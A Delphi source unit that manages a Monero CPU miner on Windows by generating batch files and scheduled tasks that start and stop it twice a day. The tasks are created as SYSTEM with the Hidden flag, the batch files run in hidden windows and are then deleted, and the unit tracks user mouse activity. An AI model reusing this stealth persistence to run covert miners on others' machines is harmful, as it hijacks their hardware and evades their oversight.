unit gvar;
interface
uses Winapi.Windows, Winapi.Messages, System.SysUtils, System.Classes,TLHELP32,Vcl.Dialogs, ShellApi;

function ProverkaRegZadaniy():Boolean;
function FindProcess(name:string):boolean;
function GetProcess: TStringList;
procedure KillCPUMiner();
procedure RunCPUMiner(half:Boolean = false);
function GetComputerNName: string;

var
  EXEPath:string;
  aHandle:HWND;
  MousePos, LastMousePos, LastMousePosOneSec:TPoint;
  LastActiveTime:TDateTime;
  UserActive:BOOL;
implementation

// Узнать имя компьютера
function GetComputerNName: string;
var
  buffer: array [0 .. 255] of Char;
  Size: DWORD;
begin
  Size := 256;
  if GetComputerName(buffer, Size) then
    Result := buffer
  else
    Result := 'Нет'
end;

function FindProcess(name:string):boolean;
var process:TStringList;
pcount,i:Integer;
begin
  process := TStringList.Create;
  process.Clear;
  process := GetProcess;
  pcount := 0;
  for i := 0 to process.Count - 1 do
    if process[i] = name then
      pcount := pcount + 1;
  if pcount > 0 then
    result := True
   else result := False;
end;

procedure KillCPUMiner();
var f:TextFile;
begin
  AssignFile(f,EXEPath+'kill.bat');
  Rewrite(f);
  Writeln(f,'taskkill.exe /F /IM NsCpuCNMiner64.exe');
  CloseFile(f);
  ShellExecute(aHandle, 'open', PWideChar(EXEPath+'kill.bat'), nil, nil, SW_HIDE);
  Sleep(100);
end;

procedure RunCPUMiner(half:Boolean = false);
var f:TextFile;
begin
  AssignFile(f,EXEPath+'run.bat');
  Rewrite(f);
  if half then Writeln(f,'schtasks /run /tn run_mine2') else Writeln(f,'schtasks /run /tn run_mine');
  CloseFile(f);
  ShellExecute(aHandle, 'open', PWideChar(EXEPath+'run.bat'), nil, nil, SW_HIDE);
end;

function GetProcess: TStringList;
const
  PROCESS_TERMINATE = $0001;
var
  Co: BOOL;
  FS: THandle;
  FP: TProcessEntry32;
begin
  Result := TStringList.Create;
  FS := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FP.dwSize := Sizeof(FP);
  Co := Process32First(FS, FP);
  while Integer(Co) <> 0 do
  begin
    Result.Add(FP.szExeFile);
    Co := Process32Next(FS, FP);
  end;
  CloseHandle(FS);
end;

function ProverkaRegZadaniy():Boolean;
var f:TextFile;
s:string;
recreate:Boolean;
bRunMine1,bRunMine2,bKillMine1,bKillMine2:BOOL;
begin
  result:=True;
  recreate:=false;
  bRunMine1 := False;
  bRunMine2 := False;
  bKillMine1 := False;
  bKillMine2 := False;

  AssignFile(f,EXEPath+'read_zad.bat');
  Rewrite(f);
  Writeln(f,'schtasks /query  >> '+EXEPath+'p0102.csv');
  CloseFile(f);

  ShellExecute(aHandle, 'open', PWideChar(EXEPath+'read_zad.bat'), nil, nil, SW_HIDE);
  Sleep(700);
  DeleteFile(EXEPath+'read_zad.bat');

  AssignFile(f,EXEPath+'p0102.csv');
  Reset(f);
  while not Eof(f) do
  begin
   Readln(f,s);
   if (AnsiPos('run_mine2',s)>0) then bRunMine2:=True;
   if (AnsiPos('run_mine',s)>0) and (AnsiPos('run_mine2',s)=0)  then bRunMine1:=True;
   if (AnsiPos('kill_mine2',s)>0) then bKillMine2:=True;
   if (AnsiPos('kill_mine',s)>0) and (AnsiPos('kill_mine2',s)=0)  then bKillMine1:=True;
  end;
  CloseFile(f);
  DeleteFile(EXEPath+'p0102.csv');
  if not (bRunMine1 and bRunMine2 and bKillMine1 and bKillMine2) then  recreate:=True;

  // Если False - удаляем службы и пересоздаем заново
  if recreate then
  begin
   AssignFile(f,EXEPath+'delete_srv.bat');
   Rewrite(f);
   Writeln(f,'schtasks /delete /tn run_mine /f');
   Writeln(f,'schtasks /delete /tn run_mine2 /f');
   Writeln(f,'schtasks /delete /tn kill_mine /f');
   Writeln(f,'schtasks /delete /tn kill_mine2 /f');
   CloseFile(f);
   ShellExecute(aHandle, 'open', PWideChar(EXEPath+'delete_srv.bat'), nil, nil, SW_HIDE);
   Sleep(1500);
   DeleteFile(EXEPath+'delete_srv.bat');
   //************************* Создаем задания ****************************************
   //      *************** Файл первого задания ***************
   AssignFile(f,EXEPath+'run_mine.xml');
   Rewrite(f);
   Writeln(f,'<?xml version="1.0" encoding="UTF-16"?>');
   Writeln(f,'<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">');
   Writeln(f,'  <Triggers>');
   Writeln(f,'    <CalendarTrigger>');
   Writeln(f,'      <StartBoundary>2015-06-22T18:00:00</StartBoundary>');
   Writeln(f,'      <Enabled>true</Enabled>');
   Writeln(f,'      <ScheduleByDay>');
   Writeln(f,'        <DaysInterval>1</DaysInterval>');
   Writeln(f,'      </ScheduleByDay>');
   Writeln(f,'    </CalendarTrigger>');
   Writeln(f,'  </Triggers>');
   Writeln(f,'   <Settings>');
   Writeln(f,'    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>');
   Writeln(f,'    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>');
   Writeln(f,'    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>');
   Writeln(f,'    <AllowHardTerminate>true</AllowHardTerminate>');
   Writeln(f,'    <StartWhenAvailable>false</StartWhenAvailable>');
   Writeln(f,'    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>');
   Writeln(f,'    <IdleSettings>');
   Writeln(f,'      <StopOnIdleEnd>true</StopOnIdleEnd>');
   Writeln(f,'      <RestartOnIdle>false</RestartOnIdle>');
   Writeln(f,'    </IdleSettings>');
   Writeln(f,'    <AllowStartOnDemand>true</AllowStartOnDemand>');
   Writeln(f,'    <Enabled>true</Enabled>');
   Writeln(f,'    <Hidden>true</Hidden>');
   Writeln(f,'    <RunOnlyIfIdle>false</RunOnlyIfIdle>');
   Writeln(f,'    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>');
   Writeln(f,'    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>');
   Writeln(f,'    <WakeToRun>false</WakeToRun>');
   Writeln(f,'    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>');
   Writeln(f,'    <Priority>7</Priority>');
   Writeln(f,'  </Settings>');
   Writeln(f,'  <Actions Context="Author">');
   Writeln(f,'    <Exec>');
   Writeln(f,'      <Command>"c:\MoneroCPU\runmine.bat"</Command>');
   Writeln(f,'      <WorkingDirectory>c:\MoneroCPU\</WorkingDirectory>');
   Writeln(f,'    </Exec>');
   Writeln(f,'  </Actions>');
   Writeln(f,'</Task>');
   CloseFile(f);
   //      *************** Файл второго задания ***************
   AssignFile(f,EXEPath+'run_mine2.xml');
   Rewrite(f);
   Writeln(f,'<?xml version="1.0" encoding="UTF-16"?>');
   Writeln(f,'<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">');
   Writeln(f,'  <Triggers>');
   Writeln(f,'    <CalendarTrigger>');
   Writeln(f,'      <StartBoundary>2015-06-22T08:00:00</StartBoundary>');
   Writeln(f,'      <Enabled>true</Enabled>');
   Writeln(f,'      <ScheduleByDay>');
   Writeln(f,'        <DaysInterval>1</DaysInterval>');
   Writeln(f,'      </ScheduleByDay>');
   Writeln(f,'    </CalendarTrigger>');
   Writeln(f,'  </Triggers>');
   Writeln(f,'   <Settings>');
   Writeln(f,'    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>');
   Writeln(f,'    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>');
   Writeln(f,'    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>');
   Writeln(f,'    <AllowHardTerminate>true</AllowHardTerminate>');
   Writeln(f,'    <StartWhenAvailable>false</StartWhenAvailable>');
   Writeln(f,'    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>');
   Writeln(f,'    <IdleSettings>');
   Writeln(f,'      <StopOnIdleEnd>true</StopOnIdleEnd>');
   Writeln(f,'      <RestartOnIdle>false</RestartOnIdle>');
   Writeln(f,'    </IdleSettings>');
   Writeln(f,'    <AllowStartOnDemand>true</AllowStartOnDemand>');
   Writeln(f,'    <Enabled>true</Enabled>');
   Writeln(f,'    <Hidden>true</Hidden>');
   Writeln(f,'    <RunOnlyIfIdle>false</RunOnlyIfIdle>');
   Writeln(f,'    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>');
   Writeln(f,'    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>');
   Writeln(f,'    <WakeToRun>false</WakeToRun>');
   Writeln(f,'    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>');
   Writeln(f,'    <Priority>7</Priority>');
   Writeln(f,'  </Settings>');
   Writeln(f,'  <Actions Context="Author">');
   Writeln(f,'    <Exec>');
   Writeln(f,'      <Command>"c:\MoneroCPU\runmine2.bat"</Command>');
   Writeln(f,'      <WorkingDirectory>c:\MoneroCPU\</WorkingDirectory>');
   Writeln(f,'    </Exec>');
   Writeln(f,'  </Actions>');
   Writeln(f,'</Task>');
   CloseFile(f);

   AssignFile(f,EXEPath+'create_srv.bat');
   Rewrite(f);
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /TN run_mine /XML c:\MoneroCPU\run_mine.xml');
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /TN run_mine2 /XML c:\MoneroCPU\run_mine2.xml');
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /SC DAILY /TN kill_mine /TR c:\MoneroCPU\kill.bat /ST 17:59');
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /SC DAILY /TN kill_mine2 /TR c:\MoneroCPU\kill.bat /ST 07:59');
   CloseFile(f);
   ShellExecute(aHandle, 'open', PWideChar(EXEPath+'create_srv.bat'), nil, nil, SW_HIDE);
   Sleep(1200);
   DeleteFile(EXEPath+'create_srv.bat');
   DeleteFile(EXEPath+'run_mine.xml');
   DeleteFile(EXEPath+'run_mine2.xml');
   result := false;
  end;
end;

end.
